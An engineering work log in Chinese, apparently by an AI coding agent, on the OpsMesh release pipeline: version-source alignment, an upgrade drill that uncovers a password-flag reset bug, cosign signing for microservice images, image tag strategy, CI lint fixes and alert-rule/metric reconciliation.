  都有 `cmd/<svc>` 且内含 `package main`，反方向也断言（有该布局却不在矩阵/豁免表 = 忘发镜像的真服务），
  并断言豁免表每条都有理由且目录真实存在。**故障注入**：把 `- tf-provider` 放回矩阵
  → 第 10 节立即 `[FAIL] … 没有 Dockerfile.service 要求的 cmd/<svc> 目录： tf-provider` 且整体 rc=1；
  还原 → `PASS=34 FAIL=0 SKIP=0`。
- **顺带暴露的第二个问题（待决）**：标签切到 `v0.9.2`，而**版本源还写着 0.9.0**
  （`Chart.yaml` 的 version/appVersion、`values-production.yaml` 三处 tag、gitops segment、
  `internal/version/version.go` 默认值）。产物本身不受影响（goreleaser 用 `{{.Version}}`、
  镜像用 `--build-arg VERSION` 从标签注入），但**按生产 values 装 Helm 的客户会部署到 0.9.0**
  ——又是"声明与事实不互相校验"，只是这次是版本维度。修法见 §23 待办：随发布 bump 版本源并让第 1 节核对。

### 19.7 版本源对齐到 0.9.2，并把「标签 == 版本源」做成发版硬门禁（2026-09-26，用户决定：重切 v0.9.2 前一并 bump）

§19.6 末尾那条待决项的处置：

- **bump 面（12 个跟踪文件，逐处按整行/次数断言，不允许"改了一半"）**：`Chart.yaml`（version + appVersion）、
  `values-production.yaml`（controlplane/agent 两处 tag + 注释 + GitOps 示例块）、`gitops/segments/production-segment.yaml`、
  `internal/version/version.go`、`docker-compose.prod.yml` 两处提示语、`deploy.sh` 两处报错示例、
  `deploy/k8s/deploy-opsmesh.sh` 的 `IMAGE_TAG` 默认值、5 份 `deploy/k8s/deployments/*.yaml`、`deploy/k8s/README.md`
  的构建示例、以及门禁自身的 compose 渲染夹具。**刻意不改**：`values-production` 里"0.9.0/0.9.1 当时没有版本标签镜像"
  这句历史事实、`docs/architecture/v1-roadmap.md` 的 `v0.9.0-rc` 里程碑、`internal/events` 测试夹具、
  第三方依赖版本号（`terraform-plugin-log v0.9.0`），以及**未跟踪的本机 `deploy/docker/.env`**
  （那是用户正在跑的部署状态，不是仓库交付物；`init` 也不会覆盖它）。
- **证据链（本机真跑）**：门禁第 1 节六项全 `0.9.2`；`detect_version()` 从改动后的 `deploy.sh` 里抽出真实函数体
  实跑返回 `0.9.2`；`helm template -f values-production.yaml` 渲染出
  `image: ghcr.io/levango7/opsmesh-binary:0.9.2` 与 `…/opsmesh-agent:0.9.2`；
  整仓 `go build ./...` 通过；13 个交付脚本 shellcheck 0 findings；门禁整体 `PASS=34 FAIL=0 SKIP=0`。
- **新硬门禁（这是关键，不是"改完就算"）**：`release.yml` 的 `build-and-push` 在 checkout 之后、构建与登录之前
  断言 `${GITHUB_REF_NAME#v} == Chart.yaml appVersion`，不等就 `::error::` + `exit 1`。
  为什么放最前：矩阵是 fail-fast，放在构建之后等于"先把一半镜像推上注册表再失败"，留下半成品产物。
  **两向验证**：抽出该 step 的真实 `run` 内容本地跑，`GITHUB_REF_NAME=v0.9.2` → rc=0 打印一致；
  `v0.9.1` → rc=1 并点名"请先 bump 版本源"。
- 生成期自我纠错一处：批量替换脚本原本按**子串**计数 `    tag: "0.9.0"`，被 7 空格缩进的注释示例行
  （其中含一段 4 空格 + `tag:`）误匹配成 3 次而报警。改成**整行相等**匹配后正是 2 处。
  ——计数断言这次的价值不是"通过"，而是**拦下了一次半改**。

### 19.8 升级路径演练：用真的 v0.9.0 二进制建库，再升到 0.9.2（2026-09-26，抓到一条客户可见缺陷）

前面所有验证都是**全新装**；商用交付里客户拿到的是**有存量数据的旧库**。本轮按 §23 第 2 项做真机升级演练。

- **为什么不能直接拿本机在跑的栈演练**：它的 `opsmesh` 库已经被我早先跑新代码时迁移过（`schema_migrations=19/19`、
  租户列与 `prev_hash` 都在），拿它升级只能验"同结构换二进制"，验不到迁移。所以演练自己造老库。
- **演练设计**（全程隔离，不碰用户那套）：`git worktree` 取 `v0.9.0` 编出**真的 0.9.0 二进制**；
  另起一台 MySQL（容器 `opsmesh-updrill-mysql`、独立卷、宿主端口 13306）；
  用 0.9.0 跑迁移建库（停在 17/17）→ 走它自己的 API 完成"首登强制改密 + 登录 + 建资源"，
  再 SQL 补两台存量设备 ⇒ 得到 `users=3 / devices=2 / audit_log=9`、`users.tenant_id` 不存在、
  `audit_log.prev_hash` 不存在的**真 0.9.0 库**。然后换 0.9.2 二进制指向同一个库。

**升级结果（断言 11 项通过，逐条实测）**：

| 检查 | 结果 |
|---|---|
| 迁移推进 | 17 → **19/19**；`018_users_tenant_id` 正常应用 |
| 第 19 条在老库上 | 走 **幂等放行** 分支：`Error 1061 Duplicate key name 'idx_audit_tenant_created'` 被正确识别后标记已应用（P0-5 那套幂等 ALTER 在真老库上按设计工作） |
| 存量数据 | `users/devices/audit_log` 行数一字不差，存量 `device_id` 仍在 |
| 018 回填 | 三个老用户全部落到 `tenant_id=default`，无 NULL/空 |
| 019 链语义 | `/api/v1/audit/verify` → `supported:true ok:true checked:6 legacyRows:9 note:"存在 9 条链前遗留行"`；指标 `opsmesh_audit_chain_{supported,ok}` 在启动后 ≤60s 内由维护循环写为 1/1（**注意这两个指标开机头一分钟是 0**，出厂告警 `for: 5m` 恰好盖住这个窗口） |
| 凭据 | 客户改过的口令哈希**没有被 seed 覆盖**；0.9.0 的预置弱口令 `admin123` 升级后仍 **401** |

**抓到的缺陷（客户可见，且不只影响升级）**：`internal/store/sql_rbac.go` 的预置用户 seed 用
`INSERT … ON DUPLICATE KEY UPDATE must_change_password=1`，而 `seedRBAC` 由 `runMigrations` 在
**每次进程启动**调用 ⇒ 改过口令的 admin 在**任何一次重启/升级/pod 重建**后都会被打回
`must_change_password=1`，登录接口于是只返回 `changePasswordToken`、**不返回会话 token**。
实测链条：升级后改密成功 → DB 里标记=0 → 重启一次 → 标记=1、登录 token 长度 0。
（口令哈希本身没丢，所以是可恢复的，但"每次重启都要管理员再改一次密码"对企业交付是不可接受的。）

- **修法**：已存在的账号**只在"该行哈希仍等于预置口令"时**才补标记（bcrypt 比对）；新账号仍 `INSERT IGNORE`
  带标记（多副本首启不撞主键报错，保留原并发语义）。
- **回归测试**（`internal/store/sql_rbac_seed_test.go`，真 MySQL 集成层）：两个方向都断言——
  改过口令的 `user-admin` 重启后必须保持 0；仍用预置口令的 `user-operator` 必须被重新标记为 1；
  外加"口令哈希不得被覆盖"与"重复 seed 幂等"。**变异检验**：把条件改回恒真（等价旧代码）→
  测试 `[FAIL] 改过口令的 admin 在重启后又被标记成 must_change_password=1（缺陷复现）`；还原 → PASS。
  这条测试的意义在于**它会红**，不是它常绿。
- **真机前后对照**：换用修好的二进制在同一老库上**连续重启两次** ⇒ `admin=0 / operator=1 / viewer=1`
  不变，admin 用改过的口令登录拿到 1977 字符 token、`mustChangePassword=false`。

**留下的决策**：`v0.9.2` 的镜像与二进制是在修复**之前**构建的，因此已发布的 0.9.2 仍带这条缺陷。
要么再移动一次标签重发，要么留给 0.9.3 并在 Release 说明里写明——属对外发布动作，未擅动。

**演练环境已清理**：停掉两个演练控制面进程、删除 `opsmesh-updrill-mysql` 容器与其卷、
移除 `v0.9.0` worktree 与临时二进制；用户在跑的那套 `opsmesh-*` 容器与 `opsmesh-mysql-data` 全程未被触碰。

### 19.9 微服务镜像从未被签名：验收第 ④ 条暴露的覆盖面缺口（2026-09-26）

四条验收里第 ④ 条是唯一没全过的：核心镜像 `opsmesh-binary:0.9.2` 的 `.sig` → 200，
而 `auth-svc:0.9.2` 的 `.sig` → **404**。查下去是结构性的：

- **签名只在 `ci.yml` 的 `image` / `image-agent`（两个核心镜像）里有**；17 个微服务镜像**只**由
  `release.yml` 的 `build-and-push` 发布，而那个 job 里**没有任何 cosign / SBOM 步骤**。
  也就是说：抓取面上永远只有 2/19 个镜像带签名证据，且这 2 个还是"顺带"签的（它们的 job 恰好走了签名逻辑）。
- **不是声明造假**：grep 过 `docs/`、`README.md`、`DELIVERY.md`，没有"所有镜像均已签名"的表述；
  `docs/test-specification.md` 只把 cosign 记在 `image` job 一行（描述当时的真实覆盖），
  反倒说明这条缺口是"能力没铺到"，不是"说了没做"。
- **处置（对齐 `ci.yml` 口径，不另起一套）**：`build-and-push` 补四步——
  ① `syft`（钉版 v1.51.1）对推送后的镜像出 SPDX JSON 并上传 artifact；
  ② `sigstore/cosign-installer`（钉 commit，cosign v2.2.4）；
  ③ `cosign sign --yes`（keyless，走 Fulcio OIDC + Rekor）；
  ④ **`cosign verify` 自验**，身份正则锁到本 workflow 文件
  （`^https://github\.com/<repo>/\.github/workflows/release\.yml@`）——验不过即失败。
  第 ④ 步是刻意的：本项目已经多次被"步骤空转但 job 绿"咬过，签完不验等于没签。
- **权限按最小集给**：`build-and-push` 单独声明 `contents: read` + `packages: write` + `id-token: write`
  （keyless 必需），不再继承 workflow 级的 `contents: write`（那个是 `changelog` / `github-release` 需要的）。
- **顺序**：SBOM 与签名放在 **Trivy 之后**——不给一个即将被判红（HIGH/CRITICAL 退出码 1）的镜像留签名。
- **本机验证口径**：`actionlint -shellcheck=` 对该 workflow 0 问题（表达式与结构层面）；
  把 `run` 块抽出、`${{ … }}` 替换为占位符后 `bash -n` + `shellcheck -S warning` 干净。
  **注意**：直接对未替换的 `run` 块跑 shellcheck 会报一片 SC2296，那是"参数展开以 `{` 开头"的假象——
  Actions 在 bash 之前就把 `${{ }}` 替换掉了，裸 shellcheck 不知道这层。别把它当真问题去"修"。
- **真跑以重切标签后的 `release` run 为准**：这三步第一次执行就在发版那一刻（§19 第 5 类"只在发版时执行"），
  所以移动标签前必须保证本机静态验证全过；`ci.yml` 的 `image` job 提供同口径的既有真跑证据。

**首跑结果（同日，run `36326611245`）**：自验证步骤**当场拦下一批**——`build-and-push (deploy-svc)`
在"自验证签名"失败，矩阵 fail-fast 取消其余。这正是加它的意义（否则会静默产出未签名的镜像并报成功）。但根因不是漏签：

| 证据 | 结论 |
|---|---|
| 同一步骤在 `aio-svc` 等 4 个 job 上 success | 检查本身有效，非配置错 |
| 失败 job 的日志：`Pushing signature to: ghcr.io/levango7/deploy-svc` + `tlog entry created with index: 2976354703` | 签名确实推上去了 |
| 两秒后 verify 报 `Error: no signatures found` | 读不到刚推的 `.sig` |
| **几分钟后复查**：`deploy-svc` 与 `aio-svc` 同一 digest 的 `.sig` 都是 **200** | **GHCR 写后读窗口**，不是缺陷 |

处置：verify 步骤改为**有界退避重试**（5 次、10/20/30/40s），**判据不放宽**——5 次都验不过仍 `::error::` 判红。
这与本项目对下载抖动的处理同一原则：只对"瞬时一致性/网络"这一类重试，且重试用尽后的失败要报得清楚。
（顺带一条经验：`cosign sign` 输出的 tlog 索引只能证明**透明日志**写成功，不能证明**注册表**已可读。）

**重切后的四条验收（run `36327166836`，19/19 job success，tag = `9347554`）——全部达成**：

| 标准 | 结果 |
|---|---|
| ① Release assets 非空 | 5 个（两种架构 tar.gz + 各自 SBOM + checksums） |
| ② 核心镜像 `:0.9.2` | `opsmesh-binary` / `opsmesh-agent` 均可解析，且 `.sig` → **200** |
| ③ 17 个微服务镜像 | **17/17** 存在 |
| ④ 签名与 SBOM | **17/17 微服务镜像 `.sig` → 200**（加核心镜像共 19/19）+ **17 份 `sbom-<svc>` 产物**（每份 ~36KB SPDX JSON） |

**同一提交的 `ci` run 反而红在 actionlint（`36327166835`）**，而这条红又是一次"本地验证方法的自证"：
报错是 `release.yml:163:9 … SC2004:style: $/${} is unnecessary on arithmetic variables`——
我在本机跑 actionlint 时用了 `-shellcheck=`（关掉 shellcheck 后端）只验结构，而替换式 shellcheck 又只跑到
`-S warning`，于是**style 级**的这条从两个网眼里同时漏掉。修法两步：把 `$((${i} * 10))` 写成 `$((i * 10))`；
并把本机验证口径固定为「抽出 run 块 → `${{ }}` 替换占位符 → `shellcheck -S style`」——
**只关后端或只查 warning 都等于给自己留一个盲区**，这正是 §20.6 那条元事实的又一次现身。

## 20. 镜像发布名与消费方引用的对齐（把 §19.4 的两个待决项做掉，2026-09-26）

§19.4 留下两条需要拍板的开口，本轮按「不改变对外契约的最小正确解」处理：

| # | 缺陷 | 处置 | 为什么是这个方向 |
|---|---|---|---|
| 1 | CI 推 `ghcr.io/levango7/opsmesh-binary\|opsmesh-agent` 且**只有 sha 标签**，而 chart 与全部文档默认 `opsmesh/opsmesh:latest` | 两边同时收敛：chart/文档改用 **CI 的实际发布名**，CI 补齐**标签策略** | 只改 chart 会留下「名字对得上但 `:latest` 不存在」；只改 CI 标签则名字仍旧。任修一半都还是 `ErrImagePull` |
| 2 | `global.imageRegistry` 与「已含主机的 repository」无条件拼接 | `templates/_helpers.tpl` 改为**首段含 `.`/`:`/`localhost` 即视为已限定**，不再叠加前缀 | 与 Docker 自身的判定规则一致；不改则 16 个微服务默认值 + 任何设了前缀的用户必然产出 `reg/ghcr.io/...` |

同步改名的消费面：`values.yaml`、`values-production.yaml`、`docs/deployment-guide.md`（CRD 示例）、
`docs/deployment-scenarios.md`（4 处 values + 2 处 image + 构建/推送命令 + 镜像说明 + 私有仓库示例去掉尾斜杠）、
`docs/operations.md`（kustomize 编辑示例）、`operator/config/crd/bases/*.yaml`（CRD 默认值）与
`operator/config/samples/*.yaml`（两份样例），以及 `values.yaml` 顶部指向不存在仓库的文档链接。

### 20.1 标签策略（`image` / `image-agent` 两个 job 同步，脚本由同一份生成）

| 触发 | 推送标签 |
|---|---|
| 任何 push | `:<sha>`（不可变，GitOps 写回的锚点） |
| 默认分支 `main` | 追加 `:latest` |
| tag `vX.Y.Z` | 追加 `:X.Y.Z`（剥掉前导 v）与 `:latest` |

feature 分支**刻意不打** `latest`：否则 `latest` 会被「最后合入者之外」的推送改写，
变成一个由分支推送顺序决定的隐式发布通道。口径与 `release.yml` 的微服务镜像一致（那边一直推 `:latest`）。

**验证方式**：把生成后的两个 step 脚本从 yaml 里抽出来，用 bash 直接喂环境变量跑，逐场景核对
`$GITHUB_OUTPUT` 的实际内容（不是读代码确认）：

| 场景 | 结果 |
|---|---|
| `main` push（无三凭证） | `mode=ghcr`，标签 = `:<sha>` + `:latest` |
| feature 分支 push | `mode=ghcr`，标签 = `:<sha>`（无 latest）✓ 刻意 |
| `v9.9.9` tag | `mode=ghcr`，标签 = `:<sha>` + `:9.9.9` + `:latest` |
| agent job（同逻辑另一 leaf） | `prefix` 落到 `…/opsmesh-agent` ✓ |
| 三凭证齐备 + `main` | `mode=private`，前缀 = `<REGISTRY>/<leaf>`，标签同上 |
| 抽掉 `IMAGE_LEAF` | **rc=1**，`${IMAGE_LEAF:?…}` 直接报错 ⇒ 不会静默产出半套标签 |

**CI 真跑已证实同一件事（run `36198676177`，commit `21bae16`，push 到 main）**——本机 bash 场景测试之外，真实发布链路兑现了承诺。推送后用匿名 token 探 GHCR：

```text
ghcr.io/levango7/opsmesh-binary:latest -> 200
ghcr.io/levango7/opsmesh-agent:latest  -> 200
```

而这两条在 §19.4 取证时**都是 404**（当时只有 sha 标签）。同一 run 里 `build-test`（含新的 actionlint step）、`security`（含 §7/§8 两道新门禁与 helm 三条新断言）、`services`、`integration`、`proto`、`release-dryrun`、`image`、`image-agent`、E2E×2、Frontend 全部 success。

**再往强里证一层（run `36205827115`，commit `a3d0d3b`）**：`:latest` 光有 200 只能说明"这个名字存在"，不能说明它指向**这次**推送。于是比对 manifest 摘要——`latest` 与 `:<完整 sha>` 两条标签的 `docker-content-digest` **逐字相同**：

```text
opsmesh-binary  latest=sha256:d113e53c6196…  sha(a3d0d3b)=sha256:d113e53c6196…  一致=YES  标签数=25
opsmesh-agent   latest=sha256:19794ff4ed26…  sha(a3d0d3b)=sha256:19794ff4ed26…  一致=YES  标签数=24
```

⇒ "`latest` 随默认分支推送前移"这条策略在注册表侧成立，而不只是在 step 里被拼进 `tags`。
（探针坑复用 §19.4 那条：`Accept` 必须含 `application/vnd.oci.image.index.v1+json`；且标签用的是
**完整 40 位 sha**——用 7 位短 sha 探会得到 404，那是探针写错，不是发布失败。本轮就差点把自家探针的 404 当成缺陷报出去。）


生成过程中踩到两处**生成期**缺陷（都属「看起来对、实际少东西」，值得单独记）：

1. 多行值写 `$GITHUB_OUTPUT` **必须**用 heredoc 定界符（`tags<<TAGSEOF` … `TAGSEOF`）。
   直接 `echo "tags=多行"` 只会取到第一行，`tags` 静默退化成单个 `:<sha>`——正是本项目反复出现的形态。
2. 前缀与标签集必须由**同一个** `IMAGE_LEAF` env 派生。生成器一度把 leaf 名内联进 `PREFIX`，
   于是 env 成了摆设、注释宣称的「只有一个来源」与实际的两个来源矛盾。已改为 4 处 `PREFIX` 全用 `${IMAGE_LEAF}`。

### 20.2 防再次分叉（三道机器判定，全部做过故障注入）

| 门禁 | 断言 | 故障注入结果 |
|---|---|---|
| `validate-deploy-assets.sh` §7 | chart 每个 `image.repository` 的**叶子名**必须落在「CI 发布名集合」=（`release.yml` 矩阵 ∪ `ci.yml` 的 `IMAGE_LEAF`）内；默认值必须自带 registry 主机（判定口径与 helper 严格一致） | 把 `values.yaml` 改回 `opsmesh/opsmesh` → `[FAIL] chart 引用了 CI 从不推送的镜像名：opsmesh/opsmesh`；还原 → PASS |
| `security` job 的 helm 段 | 默认渲染必须是 `ghcr.io/levango7/opsmesh-binary:latest` 与 `…/opsmesh-agent:latest`；digest 断言换成真实发布名；设了 `global.imageRegistry` 时**不得**出现 `registry/ghcr.io/…` 双前缀 | 本机四组渲染逐条比对：默认值 / 叶子名+前缀 / 全名+前缀 / digest 优先，均符合预期 |
| `validate-deploy-assets.sh` §8（新增） | 任何 Dockerfile 的字面 `COPY` 源必须存在于仓库，且**不得同时被 `.gitignore` 排除** | 把 §19.1 那行改回 `COPY go.work go.work.sum ./` → `[FAIL] COPY 源同时被 .gitignore 排除：Dockerfile.service:go.work.sum`；还原 → PASS=29 FAIL=0 |

§8 是第一性原理那条：**「本地能构建、干净检出必失败」必须能在静态阶段判定**，而不是等发版那一刻。
它自己实现时也踩了两个坑，均已写进脚本注释：

- `tr -d ' -'` 里的 ` -` 被 tr 解释成 **0x20~0x2D 字符区间**（含 `-` 与全部数字），
  把 `auth-svc` 洗成 `authsvc`；两边集合同时变形后门禁会长期误判。改用 `sed` 定点剥前缀。
- 跨阶段 `COPY --from=build /svc …` 的源来自上一构建阶段而非上下文，首版据此误报 6 条。
  现按「含 `--from=` 的 COPY 整条跳过」处理。

### 20.3 本轮附带关闭的两条长期开口

- **actionlint 进 CI**：`build-test` 新增钉版 v1.7.7 的检查步（本机对全部 workflow 为 0 问题）。
  理由与已抓到的四类「CI 自己骗自己」同源——workflow 是交付物，此前却只在作者本机跑过。
- **`opsmesh-binary` 与外部 GitOps chart 的关系**：私有仓库路径的 leaf 名保持**逐字不变**
  （向后兼容既有 GitOps 写回），同时仓库内 chart 现在用的就是这个 leaf 名，
  两边命名关系从此可被 §7 静态核对。仍存的不确定只剩外部 chart 的 values 结构
  （它写的是 `.global.image.tag/digest`，本仓是 `.controlplane.image.*`），需要该仓库权限，列入 §23。

### 20.4 明确不做的事

- **没有重切版本（`v0.9.2`）**：打 tag 会对外发布 Release 与镜像，属需授权动作；且应先看到
  `release-dryrun` 与新标签策略下的 `image` job 真跑绿。**这是下一轮第一优先级**——
  否则「P0/P1 修复只存在于源码、不存在于任何可安装产物」的状态没有被改变。
- **没有改 Release 的创建逻辑**：v0.9.1 那个 `assets=0` 的空壳 Release，其 `createdAt` 早于
  两条 workflow 启动 5 秒，而两条发布路径当时都判 `skipped` ⇒ 它是打 tag 时由外部（人工）创建的，
  不是流水线行为。流水线自身的门禁（`github-release` needs `build-and-push`）经核是正确的，无需改。


### 20.5 `release-dryrun` 首跑就抓到一个真实脆弱点：代理抖动会让整批发版失败

新门禁上线后第一次跑（run `36190011844`，commit `b343316`）就红了，红在第 4 步：

```
#20 ERROR: process "/bin/sh -c go mod download && go mod verify" did not complete successfully: exit 1
go: cloud.google.com/go/auth@v0.18.2: read "https://goproxy.cn/cloud.google.com/go/auth/@v/v0.18.2.info": …
```

同一份代码在下一个 run（`36190483281`，commit `c78532e`）里 step 全绿 ⇒ 判为外部抖动而非断言失败。
**但这条路径的性质使然**：`release.yml` 的镜像矩阵是 fail-fast（v0.9.1 实测「1 红 + 17 cancel」），
所以任何一次代理截断都会让整批发版失败——这不是"偶发红一下"，是**发布成功率的结构性风险**。

处置（四个 Dockerfile 同步：`Dockerfile`、`Dockerfile.agent`、`Dockerfile.service`、
`deploy/docker/Dockerfile.controlplane`）：`go mod download` 改为 5 次退避重试（5/10/15/20s），
**`go mod verify` 一次都不省**，重试用尽仍失败就明确 `exit 1` 并说明"不是抖动，是真取不到模块"。
边界写清楚：抖动是外部服务的性质，重试不改变正确性判定；`go.sum` 哈希仍然生效，坏下载无论如何过不了 verify。

验证（不给"永远 PASS"留口子，两个方向都测）：

| 方式 | 结果 |
|---|---|
| 把 `RUN` 的续行还原成 shell，用**计数型假 `go`** 注入 | 抖动 2 次 → 第 3 次成功 → `verify` 照跑 → rc=0；持续失败 → 恰好 5 次尝试 → 打印判定语 → **rc=1**（不会静默绿） |
| 真实 `docker buildx build --file Dockerfile.service`（本机 Docker，干净旗标） | **rc=0**，构建日志里能看到新的 `RUN set -eu; ok=0; for i in 1 2 3 4 5 …` 整段被执行；产物照常生成 |
| 静态门禁 §8（COPY 源 vs `.gitignore`）在改完四个 Dockerfile 后复跑 | PASS=29 / FAIL=0 / SKIP=0 |

顺带一条实现坑（写进了 Dockerfile 注释）：这些说明**必须放在 `RUN` 之上**。
本项目已经因"续行行尾"炸过一次（`RUN …  \` 变成 CR+LF 时 Docker 识别不到续行），
而把 `# 注释`写进续行中间同样会让解析器在该行截断指令——第一版就踩了，改回 shell 体内只用 `echo`。

### 20.6 新上的 actionlint 门禁首跑就把自己的本机检查证伪了

`actionlint` 步进 `build-test` 之后，**第一次 CI 运行就红了**（run `36195037306`，step 8）：
报出 **12 条** shellcheck 级问题，横跨三个 workflow：

| 类型 | 条数 | 位置与性质 |
|---|---|---|
| SC2046 词分裂 | 2 | `go test … $(go list ./... \| grep -v …)`（build-test 的 pkgs 批、race job 的同款）——这里词分裂是**故意的**，但写法确实脆：加引号会把整份清单变成一个参数 |
| SC2155 声明即赋值 | 1 | `export PATH="$(go env GOPATH)/bin:$PATH"`——`export` 的退出码盖掉 `go env` 的，go env 失败时 PATH 静默不变 |
| SC2034 循环变量未用 | 4 | `for i in $(seq 1 N); do …`（轮询等待，`i` 从不用） |
| SC2035 裸 glob | 2 | `chmod 644 *.key *.crt`（文件名以 `-` 开头会被当选项） |
| SC2086 未加引号 | 2 | `release.yml` 的 `VERSION=${GITHUB_REF_NAME#v}` 与 `>> $GITHUB_OUTPUT` |
| SC2129 重复重定向 | 1 | `shadow-observe.yml` 三次 `echo … >> $GITHUB_OUTPUT` |

**更值得记的是这条元事实**：本机此前多次跑 `actionlint` 都是 **0 问题**，CI 却报 12 条。
原因不在版本（都是 v1.7.7），而在 **actionlint 只在 `shellcheck` 在 PATH 上时才做 shell 分析**——
本机没装 shellcheck，于是那半个门禁是瞎的。这与 §18「grep 看不见 CR 的门禁在 Windows 上永远 PASS」
同族：**门禁的取证能力取决于它的后端工具是否真的在场**，而工具缺失通常不报错，只表现为"干净"。
处置：本机装上 shellcheck v0.10.0 后，12 条在本机逐条复现，之后全部在推送前修完。

修法（都是真修，没有一条靠 `# ignore` 压掉）：

- 两处 `$(go list …)` 改成 `mapfile -t PKGS < <(go list …)` + `"${PKGS[@]}"`：既不词分裂，也不把清单并成一个参数。
  顺带补上**空清单判红**——`go test "${PKGS[@]}"` 在零参数时 `build-test` 那批会退化成整模块单批
  （正是分批要避开的内存峰值场景），race 那批会退化成"只测当前目录"（静默少跑），
  而 process substitution 里 `go list` 的失败**不会触发 `set -e`**，不判就是无声漏跑。
- `GO_BIN_ROOT="$(go env GOPATH)"` 与 `export PATH=…` 拆成两行。
- 轮询循环 `for i in` → `for _ in`（4 处）；`chmod 644 *.key *.crt` → `./*.key ./*.crt`；
  `VERSION="${GITHUB_REF_NAME#v}"`、`>> "$GITHUB_OUTPUT"` 加引号；三段输出合并成 `{ …; } >> "$GITHUB_OUTPUT"`。

验证口径（如实分层，不写成「本机全绿」）：

- **复现**：本机补上门禁后端（shellcheck）后，`actionlint` 报出的正是 CI 那 12 条（同一集合，不多不少）⇒ 复现成立。
- **修复**：把改动前后的两种写法各做成一个最小脚本跑 `shellcheck`——`before.sh` 报出
  SC2034 / SC2035 / SC2046 / SC2086 / SC2155 共 9 处，`after.sh` 在 `-S warning` 下 **0 报告、rc=0**；
  数组语义另做行为验证：`run_batch` 收到 9 个独立参数（没被并成一个），空清单元素数为 0 会被守卫拦下。
- **未做**：本机没有把整份 `actionlint` 跑到底——装上 shellcheck 后全量运行超过 10 分钟仍未结束
  （CI 侧同一检查 0.7 秒完成，差在 Windows 逐脚本起进程的成本）。因此**最终结论以 CI 的 actionlint step 为准**，
  本机证据只覆盖「复现 + 逐类修复模式正确」，不含「整仓 workflow 全清」。

## 21. 监控资产对账：出厂告警有一批"永远不可能触发"（2026-09-26）

起因是清单里那条长期挂着的开口——"`/metrics` 在 8080 与 9091 返回不同序列集"。
把它当真去查，结论比"两个端口不一样"严重得多：**Prometheus 只抓 9091，
而出厂规则/面板引用的一批序列在 9091 上根本不存在**。

### 21.1 实测证据（本机独立实例，抓真实 9091）

| 被引用的序列 | 出处 | 9091 命中 | 后果 |
|---|---|---|---|
| `http_requests_total` | HighErrorRate + 总览面板 | 0（真名 `opsmesh_http_requests_total`） | 规则恒 no data |
| `http_request_duration_seconds_bucket` | HighLatency + 面板 | 0 | 同上 |
| `opsmesh_tasks_failed_total` | TaskExecutionFailed | 0（真名 `opsmesh_tasks_total{status="failed"}`） | 同上 |
| `opsmesh_device_status` | DeviceOffline | 0（**全仓从未产出过这个指标**） | 同上 |
| `process_cpu_seconds_total` | HighCPUUsage + CPU 面板 | 0（注册表只有 start_time/rss/vms/pid） | 同上 |
| `node_filesystem_*` | DiskSpaceLow | 0（栈里没有 node_exporter） | 同上 |
| `opsmesh_alerts_total{severity}`、`opsmesh_grpc_request_total`、`opsmesh_leader_elections_total` | operations.md 指标表 | 0（代码里从未实现） | 客户照文档接监控→空面板 |

关键在于**这类缺陷不会报错**：PromQL 语法合法，而 Prometheus 对无数据的处置就是不评估。
CI 也看不见，因为它只跑代码测试与静态清单，没有任何一处把"规则引用的名字"与"实际渲染的序列"放在一起对过账。
客户侧的表现是：出事那天没有告警——这与 §20 的镜像命名、§19 的发布链路是同一族问题：**声明与事实从不互相校验**。

### 21.2 处置

| 层面 | 改动 |
|---|---|
| 两个端口一份渲染 | 8080 与 9091 共用 `Server.writeMetricsBody`（`internal/controlplane/metrics_endpoint.go`）；"某序列只在另一个端口有"从此结构上不可能 |
| 补齐抓取面 | `internal/metrics` 新增应用级仪表值：`opsmesh_devices_total`、`opsmesh_device_status{status="online\|offline"}`、`opsmesh_alerts_active`、`opsmesh_tickets_open`（**0 值也恒定输出**，冷启动就能看到"0/0"而不是缺序列）；设备状态只按显式 `online`/`offline` 计数，`discovered`/`provisioning` 不塞进 offline——那会凭空造出掉线告警 |
| 补 CPU | 新增 `process_cpu_seconds_total`（counter，读 `/proc/self/stat` 的 utime+stime）。非 Linux **不输出该序列**而不是输假的 0：假的 0 会让 `rate()` 显示"CPU 空闲"，比缺数据更误导 |
| 规则口径 | `DeviceOffline` 从"离线 > 10 台"改成**占比 > 20%**（10 台的阈值对 20 台小集群永不触发、对 5000 台又太迟钝）；`HighErrorRate`/`HighLatency` 用 `{__name__=~"opsmesh_…\|…"}` **同时覆盖控制面与微服务两套命名**（见下）；直方图补 `sum by (le)`；`opsmesh_tasks_failed_total` 改用真实 counter |
| 主机级规则 | `DiskSpaceLow` 从默认文件移出，落到 `deploy/monitoring/prometheus-alerts.host.example.yml`，头部写明"需要 node_exporter，本栈不含"；另配 `DiskSpaceCritical` |
| 文档 | operations.md §4.1 指标表**重写为与实测一致**，并写明两套命名并存的事实 |

### 21.3 一个必须记住的并存事实：两套 HTTP 指标命名

控制面（`internal/metrics`）导出 `opsmesh_http_requests_total`；微服务（`pkg/metrics`，
目前 device-svc / task-svc / alert-svc 注册了 `/metrics`）导出**无前缀**的 `http_requests_total`。
两类 job 都被 Prometheus 抓取，所以任何按概念写的规则/面板**必须同时覆盖两个名字**——
第一版我只把规则改成带前缀的那种，等于把覆盖面从"全部目标"悄悄缩成"只有控制面"，
是修 bug 时新引入的窄化（已改为 `__name__` 并集，并在 operations.md 写明）。
彻底统一命名会破坏客户已有面板与告警，属版本级破坏性变更，记入待办而不是本轮擅改。

### 21.4 防复发：三条契约测试（都做了故障注入）

`internal/controlplane/metrics_contract_test.go`：

| 测试 | 断言 | 注入验证 |
|---|---|---|
| `TestShippedAlertRulesReferenceExportedMetrics` | 规则文件里表达式引用的每个 `opsmesh_*`/`process_*` 名字，必须在真实渲染的 exposition 里可见 | 把 `opsmesh_device_status` 改成带 typo 的名字 → **FAIL 并点名**；还原 → PASS |
| `TestShippedDashboardsReferenceExportedMetrics` | 出厂 Grafana 面板同罪同判 | 同上（面板引用被清空时**判红而不是静默跳过**） |
| `TestDocumentedMetricsAreExported` | operations.md 指标表第一列的每个名字必须真的能抓到 | 本轮**上线即抓到我刚写错的一行**（把 histogram 家族名写成 `opsmesh_http_request_duration_seconds`，实际导出的是 `_bucket`/`_sum`/`_count`）⇒ 门禁对我的手写字也生效 |
| `TestMetricsPortsServeIdenticalExposition` | 8080 与 9091 的序列名集合必须逐字一致（只比名字不比数值，否则 go_goroutines 会造成偶发失败） | — |

解析细节都写在注释里，避免以后被"顺手简化"掉：只从 `expr:` 行取名字（否则 YAML 的组名
`opsmesh_service_alerts` 会被当指标误判，第一版就误报了 5 条）；同时支持 JSON 里的 `{ "expr": ...` 形态；
外部导出器的序列（`node_*`）走**带理由的显式豁免表**，不塞进通用逻辑。

